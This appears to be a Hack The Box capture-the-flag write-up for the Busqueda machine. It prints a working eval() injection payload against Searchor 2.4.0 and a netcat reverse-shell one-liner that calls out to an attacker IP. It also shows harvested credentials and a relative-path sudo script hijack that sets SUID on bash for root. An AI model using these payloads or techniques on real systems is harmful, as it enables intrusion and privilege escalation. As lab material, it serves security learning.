---
layout: post
title: "HTB: Busqueda"
subtitle: "Searchor eval() command injection for a shell, .git creds reused over SSH, relative-path script hijack to root"
date: 2023-04-13
tags: [htb, linux, rce, command-injection, privesc]
category: writeups
kind: machine
tldr: "searcher.htb ran a Flask wrapper over Searchor 2.4.0, which builds an eval() string from user input. A crafted query gave RCE as svc. A leaked .git config held cody's password, reused for SSH. A root sudo script called full-checkup.sh by relative path, so dropping a malicious one in my own dir and running the script gave root."
---

## the box

Busqueda is a Linux box running Apache 2.4.52 on port 80 and SSH on 22. Port 80 serves `searcher.htb`, a Flask app that wraps the Searchor library to build search-engine URLs. Behind it, a Gitea instance runs on a local port.

## recon

nmap showed 22 and 80, with the web server redirecting to `searcher.htb`.

```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.52
```

The app ran Werkzeug 2.1.2 on Python 3.10.6 (Ubuntu 22.04), advertising Flask 2.1.2 and Searchor 2.4.0. The `/search` endpoint took `engine` and `query` and returned a URL. Searchor `<= 2.4.0` has a known eval()-based injection (SNYK-PYTHON-SEARCHOR-3166303): it builds and evals a string with the query inlined. 2.4.2 fixed it (PR #130) by dropping eval for direct attribute access.

```python
url = eval(f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})")
```

## foothold

Breaking out of the quoted query and concatenating an `eval(compile(...))` call ran arbitrary Python. POST to `/search`:

```
engine=BBC&query=http%3a//127.0.0.1/'%2beval(compile('for+x+in+range(1)%3a\n+import+os\n+os.system("id")','a','single'))%2b'&auto_redirect=
```

Swapping `id` for a reverse shell over the same structure landed a shell as `svc`:

```
os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.234 3333 >/tmp/f")
```

## user

As svc I found a Gitea checkout under `/var/www/app/.git`. Its config carried credentials in the remote URL:

```
[remote "origin"]
    url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
```

That password, `jh1usoih2bkjaspwe92`, was reused for the svc SSH account:

```
ssh svc@searcher.htb   # password jh1usoih2bkjaspwe92
```

svc held the user flag.

## root

svc could run one script as root:

```
(root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

The script takes an action. The `full-checkup` action runs `./full-checkup.sh` by relative path, not absolute:

```python
elif action == 'full-checkup':
    arg_list = ['./full-checkup.sh']
    print(run_command(arg_list))
```

So it executes from whatever directory I invoke it in. I made a working dir, dropped my own `full-checkup.sh` that SUIDs bash, and ran the sudo command from there:

```bash
mkdir ~/temp && cd ~/temp
echo -e '#!/bin/bash\nchmod u+s /bin/bash' > full-checkup.sh
chmod +x full-checkup.sh
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
/bin/bash -p
```

root-owned bash ran my script, set the SUID bit, and `bash -p` gave a root shell and the root flag.

## takeaway

An eval-based library bug gave the foothold, credentials sat in a checked-out .git config, and a sudo script calling a helper by relative path let me control what root executed. Always pin helper scripts to absolute paths.

The Gitea instance ran in Docker alongside a MySQL container on a `docker_gitea` network. Pulling the Gitea DB creds (`gitea:yuiu1hoiu4i5ho1uh`) and reusing them as the Gitea administrator password exposes the `scripts` repo, which holds the source of `system-checkup.py` and confirms the relative-path call.

## references

- [0xdf, HTB: Busqueda](https://0xdf.gitlab.io/2023/08/12/htb-busqueda.html)
- [Busqueda - HackTheBox](https://www.hackthebox.com/machines/busqueda)
